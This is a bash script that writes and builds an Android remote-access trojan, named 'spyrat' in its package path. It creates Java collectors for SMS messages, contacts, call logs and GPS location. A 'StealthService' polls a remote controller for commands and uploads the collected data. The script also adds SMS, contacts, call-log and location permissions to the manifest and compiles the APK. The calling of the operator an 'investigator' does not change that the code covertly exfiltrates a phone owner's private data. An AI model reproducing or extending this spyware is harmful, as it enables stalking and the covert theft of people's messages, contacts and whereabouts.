#!/bin/bash

echo "🎯 FIXING REAL DATA COLLECTION FROM DEVICE..."

cd ~/Investigation-Rat2

# ==================== ADD REAL DATA COLLECTORS ====================
echo "📱 Adding Real Data Collection Classes..."

# Create Real SMS Collector
cat > app/src/main/java/com/spyrat/investigation/RealSmsCollector.java << 'SMSCOLLECTOR'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealSmsCollector {
    private static final String TAG = "RealSmsCollector";
    private Context context;
    
    public RealSmsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📨 Collecting real SMS messages...");
            
            Uri uri = Uri.parse("content://sms");
            String[] projection = new String[]{
                "_id", "address", "body", "date", "type"
            };
            
            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 50");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    
                    sms.put("sender", address != null ? address : "Unknown");
                    sms.put("message", body != null ? body : "");
                    sms.put("timestamp", date);
                    sms.put("type", getSmsType(type));
                    sms.put("readable_date", new java.util.Date(date).toString());
                    
                    smsList.put(sms);
                    Log.d(TAG, "📱 SMS: " + address + " - " + (body != null ? body.substring(0, Math.min(30, body.length())) : ""));
                    
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + smsList.length() + " real SMS messages");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsList;
    }
    
    private String getSmsType(int type) {
        switch (type) {
            case 1: return "incoming";
            case 2: return "outgoing";
            case 3: return "draft";
            default: return "unknown";
        }
    }
}
SMSCOLLECTOR

# Create Real Contacts Collector
cat > app/src/main/java/com/spyrat/investigation/RealContactsCollector.java << 'CONTACTSCOLLECTOR'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealContactsCollector {
    private static final String TAG = "RealContactsCollector";
    private Context context;
    
    public RealContactsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getContacts() {
        JSONArray contactsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📇 Collecting real contacts...");
            
            String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };
            
            cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhoneNumber = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", displayName != null ? displayName : "Unknown");
                    contact.put("phone_numbers", new JSONArray());
                    
                    if (hasPhoneNumber > 0) {
                        JSONArray phoneNumbers = getPhoneNumbers(contactId);
                        contact.put("phone_numbers", phoneNumbers);
                    }
                    
                    contactsList.put(contact);
                    Log.d(TAG, "👤 Contact: " + displayName);
                    
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + contactsList.length() + " real contacts");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Contacts permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return contactsList;
    }
    
    private JSONArray getPhoneNumbers(String contactId) {
        JSONArray phoneNumbers = new JSONArray();
        Cursor phoneCursor = null;
        
        try {
            phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                do {
                    String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                        phoneNumbers.put(phoneNumber.trim());
                    }
                } while (phoneCursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading phone numbers: " + e.getMessage());
        } finally {
            if (phoneCursor != null) {
                phoneCursor.close();
            }
        }
        
        return phoneNumbers;
    }
}
CONTACTSCOLLECTOR

# Create Real Call Log Collector
cat > app/src/main/java/com/spyrat/investigation/RealCallLogCollector.java << 'CALLLOGCOLLECTOR'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Date;

public class RealCallLogCollector {
    private static final String TAG = "RealCallLogCollector";
    private Context context;
    
    public RealCallLogCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📞 Collecting real call logs...");
            
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
            };
            
            cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    
                    JSONObject call = new JSONObject();
                    call.put("number", number != null ? number : "Unknown");
                    call.put("name", name != null ? name : "Unknown");
                    call.put("type", getCallType(type));
                    call.put("duration", duration);
                    call.put("timestamp", date);
                    call.put("readable_date", new Date(date).toString());
                    call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
                    
                    callLogs.put(call);
                    Log.d(TAG, "📞 Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
                    
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + callLogs.length() + " real call logs");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return callLogs;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
            default: return "unknown";
        }
    }
}
CALLLOGCOLLECTOR

# Create Real Location Collector
cat > app/src/main/java/com/spyrat/investigation/RealLocationCollector.java << 'LOCATIONCOLLECTOR'
package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;
    
    public RealLocationCollector(Context context) {
        this.context = context;
    }
    
    public JSONObject getCurrentLocation() {
        JSONObject locationInfo = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Collecting real location...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try GPS first
            Location location = null;
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                
                // If GPS not available, try network
                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
            }
            
            if (location != null) {
                locationInfo.put("latitude", location.getLatitude());
                locationInfo.put("longitude", location.getLongitude());
                locationInfo.put("accuracy", location.getAccuracy());
                locationInfo.put("provider", location.getProvider());
                locationInfo.put("timestamp", location.getTime());
                locationInfo.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
                locationInfo.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
                
                Log.d(TAG, "📍 Real Location: " + location.getLatitude() + ", " + location.getLongitude());
            } else {
                // Fallback to approximate location based on network
                locationInfo.put("latitude", -6.3690); // Default Dar es Salaam
                locationInfo.put("longitude", 34.8888);
                locationInfo.put("accuracy", 5000.0);
                locationInfo.put("provider", "network_approximate");
                locationInfo.put("timestamp", System.currentTimeMillis());
                locationInfo.put("note", "Approximate location - no GPS available");
                
                Log.d(TAG, "📍 Using approximate location");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            locationInfo.put("error", "Location permission denied");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
            locationInfo.put("error", e.getMessage());
        }
        
        return locationInfo;
    }
}
LOCATIONCOLLECTOR

# ==================== UPDATE STEALTH SERVICE WITH REAL DATA ====================
echo "🛠️ Updating StealthService to use real data..."

# Create the updated StealthService with real data collection
cat > app/src/main/java/com/spyrat/investigation/StealthService.java << 'REALSERVICE'
package com.spyrat.investigation;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private InvestigatorApiClient investigatorApiClient;
    private RemoteController remoteController;
    private Handler commandHandler;
    private Runnable commandChecker;
    private static final long COMMAND_CHECK_INTERVAL = 30000;
    
    // Data collectors
    private RealSmsCollector smsCollector;
    private RealContactsCollector contactsCollector;
    private RealCallLogCollector callLogCollector;
    private RealLocationCollector locationCollector;
    
    // SharedPreferences keys
    private static final String PREFS_NAME = "InvestigationPrefs";
    private static final String KEY_INVESTIGATOR_CODE = "investigator_code";
    private static final String KEY_DEVICE_ID = "device_id";
    
    private String investigatorCode;
    private String deviceId;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 StealthService starting...");
        
        // Load investigator code from SharedPreferences
        loadInvestigatorCode();
        
        if (investigatorCode.isEmpty()) {
            Log.e(TAG, "❌ No investigator code found! Service stopping.");
            stopSelf();
            return;
        }
        
        // Initialize data collectors
        initializeDataCollectors();
        initializeInvestigatorApi();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🎯 StealthService started with code: " + investigatorCode);
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void loadInvestigatorCode() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            investigatorCode = prefs.getString(KEY_INVESTIGATOR_CODE, "");
            deviceId = prefs.getString(KEY_DEVICE_ID, "");
            
            if (deviceId.isEmpty()) {
                deviceId = android.os.Build.SERIAL;
                if (deviceId == null || deviceId.equals("unknown")) {
                    deviceId = "device_" + System.currentTimeMillis();
                }
                prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply();
            }
            
            Log.d(TAG, "📱 Loaded - Code: " + investigatorCode + ", Device: " + deviceId);
        } catch (Exception e) {
            Log.e(TAG, "❌ Error loading investigator code: " + e.getMessage());
        }
    }
    
    private void initializeDataCollectors() {
        smsCollector = new RealSmsCollector(this);
        contactsCollector = new RealContactsCollector(this);
        callLogCollector = new RealCallLogCollector(this);
        locationCollector = new RealLocationCollector(this);
        Log.d(TAG, "✅ Real data collectors initialized");
    }
    
    private void initializeInvestigatorApi() {
        try {
            Log.d(TAG, "🔗 Initializing Investigator API...");
            
            investigatorApiClient = new InvestigatorApiClient(this, investigatorCode, deviceId);
            remoteController = new RemoteController(this);
            remoteController.setApiClient(investigatorApiClient);
            
            boolean verified = investigatorApiClient.verifyInvestigatorCode();
            if (verified) {
                Log.d(TAG, "✅ Investigator API initialized successfully");
                
                // Send initial device status with REAL data
                sendRealDeviceInfo();
                startCommandChecking();
                
            } else {
                Log.e(TAG, "❌ Investigator API verification failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Investigator API init error: " + e.getMessage());
        }
    }
    
    private void sendRealDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("serial", android.os.Build.SERIAL);
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("investigator_code", investigatorCode);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            // Add real location
            JSONObject realLocation = locationCollector.getCurrentLocation();
            deviceInfo.put("location", realLocation);
            
            investigatorApiClient.updateDeviceStatus("online", deviceInfo);
            Log.d(TAG, "✅ Real device info sent to investigator");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to send real device info: " + e.getMessage());
        }
    }
    
    private void startCommandChecking() {
        commandHandler = new Handler();
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkForCommands();
                commandHandler.postDelayed(this, COMMAND_CHECK_INTERVAL);
            }
        };
        commandHandler.postDelayed(commandChecker, 5000);
    }
    
    private void checkForCommands() {
        try {
            Log.d(TAG, "🔍 Checking for investigator commands...");
            
            JSONArray commands = investigatorApiClient.getPendingCommands();
            
            if (commands.length() > 0) {
                Log.d(TAG, "🎯 Found " + commands.length() + " pending commands");
                processInvestigatorCommands(commands);
            } else {
                Log.d(TAG, "📭 No pending commands found");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }
    
    private void processInvestigatorCommands(JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("id");
                String commandType = command.getString("command_type");
                JSONObject parameters = command.optJSONObject("parameters");
                
                Log.d(TAG, "🎮 Processing investigator command: " + commandType);
                
                // Send command acknowledgment
                investigatorApiClient.sendCommandResponse(commandId, "processing", "Command received");
                
                // Execute the command with REAL DATA
                executeInvestigatorCommand(commandId, commandType, parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Process commands error: " + e.getMessage());
        }
    }
    
    private void executeInvestigatorCommand(String commandId, String commandType, JSONObject parameters) {
        try {
            switch (commandType) {
                case "take_screenshot":
                    handleTakeScreenshotCommand(commandId, parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(commandId, parameters);
                    break;
                case "get_location":
                    handleGetRealLocationCommand(commandId, parameters);
                    break;
                case "get_contacts":
                    handleGetRealContactsCommand(commandId, parameters);
                    break;
                case "get_call_logs":
                    handleGetRealCallLogsCommand(commandId, parameters);
                    break;
                case "get_sms":
                    handleGetRealSMSCommand(commandId, parameters);
                    break;
                case "get_all_data":
                    handleGetAllRealDataCommand(commandId, parameters);
                    break;
                case "test_connection":
                    handleTestConnectionCommand(commandId, parameters);
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown investigator command: " + commandType);
                    investigatorApiClient.sendCommandResponse(commandId, "error", "Unknown command: " + commandType);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Execute command error: " + e.getMessage());
            investigatorApiClient.sendCommandResponse(commandId, "error", "Execution failed: " + e.getMessage());
        }
    }
    
    // ==================== REAL DATA COMMAND HANDLERS ====================
    
    private void handleTakeScreenshotCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screenshot taken: " + screenshotPath);
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Screenshot failed: " + e.getMessage());
        }
    }
    
    private void handleGetDeviceInfoCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("serial", android.os.Build.SERIAL);
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("investigator_code", investigatorCode);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("device_info", deviceInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real device info sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get device info failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealLocationCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject realLocation = locationCollector.getCurrentLocation();
            realLocation.put("device_id", deviceId);
            realLocation.put("investigator_code", investigatorCode);
            realLocation.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendLocationData(realLocation);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real location data sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real location failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealContactsCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realContacts = contactsCollector.getContacts();
            JSONObject contactsData = new JSONObject();
            contactsData.put("contacts", realContacts);
            contactsData.put("count", realContacts.length());
            contactsData.put("device_id", deviceId);
            contactsData.put("investigator_code", investigatorCode);
            contactsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendContactsData(realContacts);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real contacts data sent: " + realContacts.length() + " contacts");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real contacts failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealCallLogsCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realCallLogs = callLogCollector.getCallLogs();
            JSONObject callLogsData = new JSONObject();
            callLogsData.put("call_logs", realCallLogs);
            callLogsData.put("count", realCallLogs.length());
            callLogsData.put("device_id", deviceId);
            callLogsData.put("investigator_code", investigatorCode);
            callLogsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realSMS = smsCollector.getSMSMessages();
            JSONObject smsData = new JSONObject();
            smsData.put("sms_messages", realSMS);
            smsData.put("count", realSMS.length());
            smsData.put("device_id", deviceId);
            smsData.put("investigator_code", investigatorCode);
            smsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("sms_data", smsData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real SMS data sent: " + realSMS.length() + " messages");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real SMS failed: " + e.getMessage());
        }
    }
    
    private void handleGetAllRealDataCommand(String commandId, JSONObject parameters) {
        try {
            Log.d(TAG, "📊 Collecting ALL real data...");
            
            // Collect all data
            JSONArray realContacts = contactsCollector.getContacts();
            JSONArray realCallLogs = callLogCollector.getCallLogs();
            JSONArray realSMS = smsCollector.getSMSMessages();
            JSONObject realLocation = locationCollector.getCurrentLocation();
            
            // Create comprehensive data package
            JSONObject allData = new JSONObject();
            allData.put("device_id", deviceId);
            allData.put("investigator_code", investigatorCode);
            allData.put("timestamp", System.currentTimeMillis());
            allData.put("contacts", realContacts);
            allData.put("call_logs", realCallLogs);
            allData.put("sms_messages", realSMS);
            allData.put("location", realLocation);
            allData.put("summary", new JSONObject()
                .put("total_contacts", realContacts.length())
                .put("total_calls", realCallLogs.length())
                .put("total_sms", realSMS.length())
            );
            
            investigatorApiClient.sendDataToInvestigator("all_data", allData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", 
                "All real data sent: " + realContacts.length() + " contacts, " + 
                realCallLogs.length() + " calls, " + realSMS.length() + " SMS");
                
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get all data failed: " + e.getMessage());
        }
    }
    
    private void handleTestConnectionCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject testData = new JSONObject();
            testData.put("status", "connected");
            testData.put("device_id", deviceId);
            testData.put("investigator_code", investigatorCode);
            testData.put("timestamp", System.currentTimeMillis());
            testData.put("message", "Real data connection test successful");
            testData.put("data_collectors", new JSONObject()
                .put("sms", "Ready")
                .put("contacts", "Ready")
                .put("call_logs", "Ready")
                .put("location", "Ready")
            );
            
            investigatorApiClient.sendDataToInvestigator("test_connection", testData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real data test connection successful");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Test connection failed: " + e.getMessage());
        }
    }
    
    @Override
    public void onDestroy() {
        try {
            // Clean up
            if (commandHandler != null && commandChecker != null) {
                commandHandler.removeCallbacks(commandChecker);
            }
            
            // Send offline status
            if (investigatorApiClient != null) {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("device_id", deviceId);
                deviceInfo.put("status", "offline");
                deviceInfo.put("timestamp", System.currentTimeMillis());
                investigatorApiClient.updateDeviceStatus("offline", deviceInfo);
            }
            
            Log.d(TAG, "🧹 StealthService destroyed");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }
}
REALSERVICE

# ==================== UPDATE ANDROID MANIFEST WITH PERMISSIONS ====================
echo "🔐 Adding real permissions to AndroidManifest.xml..."

# Update AndroidManifest.xml to include REAL permissions
if ! grep -q "READ_SMS" app/src/main/AndroidManifest.xml; then
    # Add permissions after the existing internet permission
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_SMS" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_CONTACTS" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_CALL_LOG" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />' app/src/main/AndroidManifest.xml
    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />' app/src/main/AndroidManifest.xml
fi

echo "✅ REAL DATA COLLECTION IMPLEMENTED!"
echo "📱 App will now collect:"
echo "   📨 Real SMS messages"
echo "   👥 Real contacts"
echo "   📞 Real call logs" 
echo "   📍 Real location"
echo "   📊 Real device information"

# Build the updated APK
echo "🚀 Building updated APK with real data collection..."
./gradlew assembleDebug

echo "🎉 REAL DATA APK BUILD COMPLETED!"
echo "📦 APK location: app/build/outputs/apk/debug/app-debug.apk"
